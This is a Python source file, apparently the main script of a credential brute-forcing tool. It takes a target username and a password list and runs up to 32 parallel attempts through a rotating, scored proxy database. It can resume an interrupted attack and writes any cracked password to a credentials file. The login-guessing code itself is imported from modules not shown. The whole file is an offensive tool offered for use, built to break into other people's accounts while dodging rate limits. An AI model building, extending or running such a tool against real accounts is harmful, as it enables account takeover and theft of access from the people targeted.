# Date: 12/29/2018
# Author: Mohamed

import os
import time
from sys import exit
from lib import database
from lib.proxy_manager import ProxyManager

from lib.bruter import Bruter
from lib.display import Display
from platform import python_version

from lib.const import credentials, modes
from argparse import ArgumentParser, ArgumentTypeError

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.prompt import Prompt

console = Console()

class Engine(object):
    def __init__(self, username, threads, passlist_path, is_color):
        self.resume = False
        self.is_alive = True
        self.threads = threads
        self.username = username
        self.passlist_path = passlist_path
        self.display = Display(is_color=is_color)
        self.bruter = Bruter(username, threads, passlist_path)

    def get_user_resp(self):
        return self.display.prompt("Would you like to resume the attack? [y/N]: ")

    def write_to_file(self, password):
        with open(credentials, "at") as f:
            data = "Username: {}\nPassword: {}\n\n".format(self.username.title(), password)
            f.write(data)
        console.print(Panel(f"[green]Saved credentials for {self.username.title()}[/green]", border_style="green"))

    def start(self):

        while self.is_alive and not self.bruter.password_manager.session:
            pass

        if not self.is_alive:
            return

        if self.bruter.password_manager.session.exists:
            try:
                resp = self.get_user_resp()
            except Exception:
                self.is_alive = False
                resp = None

            if resp and self.is_alive:
                if resp.strip().lower() == "y":
                    self.bruter.password_manager.resume = True

        try:
            self.bruter.start()
        except KeyboardInterrupt:
            self.bruter.stop()
            self.bruter.display.shutdown(
                self.bruter.last_password,
                self.bruter.password_manager.attempts,
                len(self.bruter.browsers),
            )
        finally:
            self.stop()

    def stop(self):
        if self.is_alive:

            self.bruter.stop()
            self.is_alive = False

            if (
                self.bruter.password_manager.is_read
                and not self.bruter.is_found
                and not self.bruter.password_manager.list_size
            ):
                self.bruter.display.stats_not_found(
                    self.bruter.last_password,
                    self.bruter.password_manager.attempts,
                    len(self.bruter.browsers),
                )

            if self.bruter.is_found:
                self.write_to_file(self.bruter.password)
                self.bruter.display.stats_found(
                    self.bruter.password,
                    self.bruter.password_manager.attempts,
                    len(self.bruter.browsers),
                )


def valid_int(n):
    if not n.isdigit():
        raise ArgumentTypeError("mode must be a number")

    n = int(n)

    if n > 3:
        raise ArgumentTypeError("maximum for a mode is 3")

    if n < 0:
        raise ArgumentTypeError("minimum for a mode is 0")

    return n


def valid_float(n):

    err_msg = "prune must be a value between 0 and 1"

    try:
        n = float(n)
    except ValueError:
        raise ArgumentTypeError(err_msg)

    if n < 0 or n > 1:
        raise ArgumentTypeError(err_msg)

    return n


def args():
    args = ArgumentParser()
    args.add_argument("-u", "--username", help="email or username")
    args.add_argument("-p", "--passlist", help="password list")
    args.add_argument("-px", "--proxylist", help="proxy list")
    args.add_argument(
        "--prune",
        default=-1,
        type=valid_float,
        help="prune the database",
    )
    args.add_argument(
        "--stats", action="store_true", help="get statistics of the proxies"
    )

    args.add_argument(
        "-nc",
        "--no-color",
        dest="color",
        action="store_true",
        help="disable colors",
    )
    args.add_argument(
        "-m",
        "--mode",
        default=2,
        type=valid_int,
        help="modes: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots",
    )

    # ----------- #

    arguments = args.parse_args()
    username = arguments.username
    passlist = arguments.passlist
    proxylist = arguments.proxylist
    prune = arguments.prune
    stats = arguments.stats
    prune_db = prune > 0

    if not (prune_db or stats or proxylist) and not (username and passlist):
        args.print_help()
        exit()

    return args.parse_args()


def prune_database(prune: float) -> None:
    score = prune * 100

    resp = Prompt.ask("Are you sure you want to prune the database of proxies? [y/N]", default="N")
    if resp.strip().lower() == "y":

        console.print(Panel(Text(f"<<< Pruning the database of all proxies with a score of {score}% or less >>>"), border_style="green"))
        time.sleep(0.65)

        pruned = database.Proxy().prune(prune)
        console.print(Panel(Text(f"Pruned the database of {pruned} proxies"), border_style="green"))
        time.sleep(0.65)
    else:
        console.print(Panel(Text("Pruning cancelled"), border_style="green"))


def display_database_stats():
    data = database.Proxy().stats()

    place = 5

    q1 = round(data["q1"], place)
    avg = round(data["avg"], place)
    min_ = round(data["min"], place)
    max_ = round(data["max"], place)
    total = data["total"]
    health = (
        "Dead"
        if avg == 0
        else "Very-ill"
        if avg <= 0.10
        else "Ill"
        if avg <= 0.30
        else "Somewhat-ill"
        if avg <= 0.50
        else "Normal"
        if avg <= 0.70
        else "Healthy"
        if avg <= 0.9
        else "Very-healthy"
    )

    tbl = Table(title="[green]Proxy Database Statistics[/green]", show_lines=False, box=None)
    tbl.add_column("Metric", style="cyan", justify="right")
    tbl.add_column("Value", style="white", justify="left")
    tbl.add_row("Total Proxies", str(total))
    tbl.add_row("Database's Health", health)
    tbl.add_row("Q1", str(q1))
    tbl.add_row("Avg Score", str(avg))
    tbl.add_row("Min Score", str(min_))
    tbl.add_row("Max Score", str(max_))

    console.print(tbl)
    time.sleep(0.65)


def main():
    arguments = args()
    mode = arguments.mode
    username = arguments.username
    passlist = arguments.passlist
    proxylist = arguments.proxylist
    prune = arguments.prune
    stats = arguments.stats
    prune_db = prune > 0

    if prune_db > 0 or stats:
        if prune_db > 0:
            prune_database(prune)
        if stats:
            display_database_stats()
    else:
        if proxylist:
            if not os.path.exists(proxylist):
                console.print(Panel("[red]Invalid path to proxy list[/red]", border_style="green"))
                exit()

            console.print(Panel("[green]<<< Writing proxies to the database >>>[/green]", border_style="green"))
            time.sleep(0.65)

            total_written = ProxyManager().write2db(proxylist)

            console.print(Panel(f"[green]Proxies written to the database: {total_written}[/green]", border_style="green"))
            time.sleep(0.65)

        total_proxies = len(database.Proxy().get_proxies())

        if username and passlist and total_proxies:

            if not os.path.exists(passlist):
                console.print(Panel("[red]Invalid path to password list[/red]", border_style="green"))
                exit()

            Engine(username, modes[mode], passlist, not arguments.color).start()

        else:
            if not proxylist or total_proxies == 0:
                console.print(Panel("[red]No proxies in the database and no proxy list provided[/red]", border_style="green"))


if __name__ == "__main__":

    if int(python_version()[0]) < 3:
        console.print(Panel("[red][!] Please use Python 3[/red]", border_style="green"))
        exit()

    main()
